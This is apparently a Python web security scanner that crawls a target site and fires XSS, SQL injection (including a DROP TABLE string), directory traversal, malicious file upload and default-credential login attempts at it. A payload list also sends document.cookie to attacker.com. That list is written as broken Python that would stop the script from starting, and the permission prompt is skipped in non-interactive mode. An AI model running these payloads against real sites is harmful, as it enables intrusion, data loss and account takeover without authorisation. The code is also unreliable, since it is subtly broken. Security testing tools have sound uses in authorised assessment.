#!/usr/bin/env python3
"""
Web Application Security Scanner
A comprehensive tool for testing web applications for common vulnerabilities.
Use only on websites you own or have explicit permission to test.

Author: Security Researcher
Version: 1.0
"""

import requests
import urllib.parse
import re
import time
import json
import argparse
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import threading
from concurrent.futures import ThreadPoolExecutor
import logging
from datetime import datetime

class WebSecurityScanner:
    def __init__(self, target_url, username=None, password=None, max_threads=5):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.max_threads = max_threads
        self.session = requests.Session()
        self.vulnerabilities = []
        self.endpoints = set()
        self.forms = []
        
        # Setup logging
        try:
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler(f'security_scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
                    logging.StreamHandler()
                ]
            )
        except Exception as e:
            # Fallback to console-only logging if file logging fails
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[logging.StreamHandler()]
            )
            print(f"Warning: Could not setup file logging: {e}")
        
        self.logger = logging.getLogger(__name__)
        
        # Common payloads for testing
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>'
        ]
        
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin'--",
            "' OR 'x'='x"
        ]
        
        self.csrf_payloads = [
            '<form action="http://attacker.com/steal" method="POST">',
            '<img src="http://attacker.com/steal?cookie=' + document.cookie + '">',
            '<script>fetch("http://attacker.com/steal", {method: "POST", body: document.cookie})</script>'
        ]

    def authenticate(self):
        """Attempt to authenticate if credentials are provided"""
        if not self.username or not self.password:
            self.logger.info("No credentials provided, skipping authentication")
            return False
            
        try:
            login_data = {
                'email': self.username,
                'password': self.password
            }
            
            response = self.session.post(f"{self.target_url}/login", data=login_data)
            if response.status_code == 200:
                self.logger.info("Authentication successful")
                return True
            else:
                self.logger.warning("Authentication failed")
                return False
        except Exception as e:
            self.logger.error(f"Authentication error: {e}")
            return False

    def crawl_endpoints(self):
        """Crawl the website to discover endpoints"""
        self.logger.info("Starting endpoint discovery...")
        
        try:
            response = self.session.get(self.target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all links
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('/') or href.startswith(self.target_url):
                    full_url = urljoin(self.target_url, href)
                    self.endpoints.add(full_url)
            
            # Find all forms
            for form in soup.find_all('form'):
                form_info = {
                    'action': urljoin(self.target_url, form.get('action', '')),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_field in form.find_all(['input', 'textarea', 'select']):
                    input_info = {
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text'),
                        'value': input_field.get('value', '')
                    }
                    form_info['inputs'].append(input_info)
                
                self.forms.append(form_info)
            
            self.logger.info(f"Discovered {len(self.endpoints)} endpoints and {len(self.forms)} forms")
            
        except Exception as e:
            self.logger.error(f"Error during crawling: {e}")

    def test_xss(self, url, form_data=None):
        """Test for Cross-Site Scripting vulnerabilities"""
        self.logger.info(f"Testing XSS on: {url}")
        
        for payload in self.xss_payloads:
            try:
                if form_data:
                    # Test form-based XSS
                    test_data = form_data.copy()
                    for field in test_data:
                        if test_data[field] and isinstance(test_data[field], str):
                            test_data[field] = payload
                    
                    response = self.session.post(url, data=test_data)
                else:
                    # Test URL parameter XSS
                    test_url = f"{url}?test={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url)
                
                if payload in response.text:
                    vulnerability = {
                        'type': 'Cross-Site Scripting (XSS)',
                        'url': url,
                        'payload': payload,
                        'risk_level': 'High',
                        'description': 'XSS payload found in response',
                        'mitigation': 'Implement proper input validation and output encoding'
                    }
                    self.vulnerabilities.append(vulnerability)
                    self.logger.warning(f"XSS vulnerability found: {payload}")
                    
            except Exception as e:
                self.logger.error(f"Error testing XSS: {e}")

    def test_sql_injection(self, url, form_data=None):
        """Test for SQL Injection vulnerabilities"""
        self.logger.info(f"Testing SQL Injection on: {url}")
        
        for payload in self.sqli_payloads:
            try:
                if form_data:
                    # Test form-based SQL injection
                    test_data = form_data.copy()
                    for field in test_data:
                        if test_data[field] and isinstance(test_data[field], str):
                            test_data[field] = payload
                    
                    response = self.session.post(url, data=test_data)
                else:
                    # Test URL parameter SQL injection
                    test_url = f"{url}?id={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url)
                
                # Check for common SQL error messages
                sql_errors = [
                    'sql syntax',
                    'mysql_fetch',
                    'oracle error',
                    'postgresql error',
                    'sql server error',
                    'mysql_num_rows'
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'payload': payload,
                            'risk_level': 'Critical',
                            'description': f'SQL error detected: {error}',
                            'mitigation': 'Use parameterized queries and input validation'
                        }
                        self.vulnerabilities.append(vulnerability)
                        self.logger.warning(f"SQL Injection vulnerability found: {payload}")
                        break
                        
            except Exception as e:
                self.logger.error(f"Error testing SQL injection: {e}")

    def test_csrf(self, url, form_data=None):
        """Test for CSRF vulnerabilities"""
        self.logger.info(f"Testing CSRF on: {url}")
        
        try:
            if form_data and form_data.get('method') == 'POST':
                # Check if CSRF token exists
                response = self.session.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                csrf_tokens = soup.find_all('input', {'name': re.compile(r'csrf|token|_token', re.I)})
                
                if not csrf_tokens:
                    vulnerability = {
                        'type': 'Cross-Site Request Forgery (CSRF)',
                        'url': url,
                        'payload': 'No CSRF token found',
                        'risk_level': 'High',
                        'description': 'Form lacks CSRF protection',
                        'mitigation': 'Implement CSRF tokens and validate them server-side'
                    }
                    self.vulnerabilities.append(vulnerability)
                    self.logger.warning("CSRF vulnerability found: No CSRF token")
                    
        except Exception as e:
            self.logger.error(f"Error testing CSRF: {e}")

    def test_file_upload(self, url, form_data=None):
        """Test for file upload vulnerabilities"""
        self.logger.info(f"Testing file upload on: {url}")
        
        try:
            if form_data:
                # Check if form has file upload capability
                has_file_upload = any(input_field.get('type') == 'file' for input_field in form_data.get('inputs', []))
                
                if has_file_upload:
                    # Test with malicious file types
                    malicious_files = [
                        ('test.php', '<?php echo "test"; ?>', 'text/php'),
                        ('test.jsp', '<% out.println("test"); %>', 'text/jsp'),
                        ('test.asp', '<% Response.Write("test") %>', 'text/asp')
                    ]
                    
                    for filename, content, mime_type in malicious_files:
                        files = {'file': (filename, content, mime_type)}
                        response = self.session.post(url, files=files)
                        
                        if response.status_code == 200:
                            vulnerability = {
                                'type': 'File Upload Vulnerability',
                                'url': url,
                                'payload': f'Uploaded {filename}',
                                'risk_level': 'High',
                                'description': f'Successfully uploaded {filename}',
                                'mitigation': 'Implement strict file type validation and scanning'
                            }
                            self.vulnerabilities.append(vulnerability)
                            self.logger.warning(f"File upload vulnerability: {filename}")
                            
        except Exception as e:
            self.logger.error(f"Error testing file upload: {e}")

    def test_authentication(self):
        """Test for authentication and authorization flaws"""
        self.logger.info("Testing authentication and authorization...")
        
        try:
            # Test for default credentials
            default_creds = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('root', 'root'),
                ('test', 'test')
            ]
            
            for username, password in default_creds:
                login_data = {
                    'email': username,
                    'password': password
                }
                
                response = self.session.post(f"{self.target_url}/login", data=login_data)
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    vulnerability = {
                        'type': 'Weak Authentication',
                        'url': f"{self.target_url}/login",
                        'payload': f'{username}:{password}',
                        'risk_level': 'Medium',
                        'description': f'Default credentials work: {username}:{password}',
                        'mitigation': 'Change default credentials and implement strong password policies'
                    }
                    self.vulnerabilities.append(vulnerability)
                    self.logger.warning(f"Weak authentication: {username}:{password}")
                    
        except Exception as e:
            self.logger.error(f"Error testing authentication: {e}")

    def test_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        self.logger.info("Testing directory traversal...")
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        for payload in traversal_payloads:
            try:
                test_url = f"{self.target_url}/file?path={payload}"
                response = self.session.get(test_url)
                
                if 'root:' in response.text or 'Administrator' in response.text:
                    vulnerability = {
                        'type': 'Directory Traversal',
                        'url': test_url,
                        'payload': payload,
                        'risk_level': 'High',
                        'description': 'Directory traversal successful',
                        'mitigation': 'Validate and sanitize file paths'
                    }
                    self.vulnerabilities.append(vulnerability)
                    self.logger.warning(f"Directory traversal vulnerability: {payload}")
                    
            except Exception as e:
                self.logger.error(f"Error testing directory traversal: {e}")

    def run_scan(self):
        """Run the complete security scan"""
        self.logger.info(f"Starting security scan of: {self.target_url}")
        
        # Authenticate if credentials provided
        if self.username and self.password:
            self.authenticate()
        
        # Crawl for endpoints and forms
        self.crawl_endpoints()
        
        # Test each endpoint and form
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Test main endpoints
            for endpoint in list(self.endpoints)[:10]:  # Limit to first 10 endpoints
                executor.submit(self.test_xss, endpoint)
                executor.submit(self.test_sql_injection, endpoint)
                executor.submit(self.test_csrf, endpoint)
                executor.submit(self.test_file_upload, endpoint)
            
            # Test forms
            for form in self.forms:
                form_data = {input_field['name']: input_field['value'] for input_field in form['inputs'] if input_field['name']}
                executor.submit(self.test_xss, form['action'], form_data)
                executor.submit(self.test_sql_injection, form['action'], form_data)
                executor.submit(self.test_csrf, form['action'], form_data)
                executor.submit(self.test_file_upload, form['action'], form_data)
        
        # Test authentication and directory traversal
        self.test_authentication()
        self.test_directory_traversal()
        
        self.logger.info("Security scan completed")
        return self.generate_report()

    def generate_report(self):
        """Generate a comprehensive security report"""
        report = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'total_vulnerabilities': len(self.vulnerabilities)
            },
            'vulnerabilities': self.vulnerabilities,
            'endpoints_discovered': len(self.endpoints),
            'forms_discovered': len(self.forms)
        }
        
        # Save report to file
        report_filename = f'security_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(report_filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Print summary
        print("\n" + "="*60)
        print("SECURITY SCAN REPORT")
        print("="*60)
        print(f"Target: {self.target_url}")
        print(f"Scan Date: {report['scan_info']['scan_date']}")
        print(f"Total Vulnerabilities: {report['scan_info']['total_vulnerabilities']}")
        print(f"Endpoints Discovered: {report['endpoints_discovered']}")
        print(f"Forms Discovered: {report['forms_discovered']}")
        print("="*60)
        
        if self.vulnerabilities:
            print("\nVULNERABILITIES FOUND:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. {vuln['type']}")
                print(f"   Risk Level: {vuln['risk_level']}")
                print(f"   URL: {vuln['url']}")
                print(f"   Description: {vuln['description']}")
                print(f"   Mitigation: {vuln['mitigation']}")
        else:
            print("\nNo vulnerabilities detected in this scan.")
        
        print(f"\nDetailed report saved to: {report_filename}")
        return report

def main():
    parser = argparse.ArgumentParser(description='Web Application Security Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--username', help='Username for authentication')
    parser.add_argument('--password', help='Password for authentication')
    parser.add_argument('--threads', type=int, default=5, help='Maximum number of threads')
    parser.add_argument('--non-interactive', action='store_true', help='Skip interactive prompts (for CI/CD)')
    
    args = parser.parse_args()
    
    # Safety check
    if not args.url.startswith(('http://', 'https://')):
        print("Error: Please provide a valid URL starting with http:// or https://")
        return
    
    print("WARNING: This tool is for educational purposes only.")
    print("Only use on websites you own or have explicit permission to test.")
    print("Unauthorized security testing is illegal and unethical.")
    
    # Skip confirmation in non-interactive mode (like GitHub Actions)
    if not args.non_interactive:
        try:
            confirm = input("\nDo you have permission to test this website? (yes/no): ")
            if confirm.lower() != 'yes':
                print("Scan cancelled. Please obtain proper authorization before testing.")
                return
        except EOFError:
            # Running in non-interactive environment, assume permission granted
            print("Running in non-interactive mode. Assuming permission granted.")
    else:
        print("Running in non-interactive mode. Assuming permission granted.")
    
    try:
        scanner = WebSecurityScanner(
            target_url=args.url,
            username=args.username,
            password=args.password,
            max_threads=args.threads
        )
        
        result = scanner.run_scan()
        if result:
            print("✅ Scan completed successfully!")
            return 0
        else:
            print("⚠️ Scan completed but no results generated")
            return 0
        
    except KeyboardInterrupt:
        print("\nScan interrupted by user.")
        return 0
    except Exception as e:
        print(f"❌ Error during scan: {e}")
        # Exit with error code for CI/CD only for actual failures
        return 1

if __name__ == "__main__":
    main()
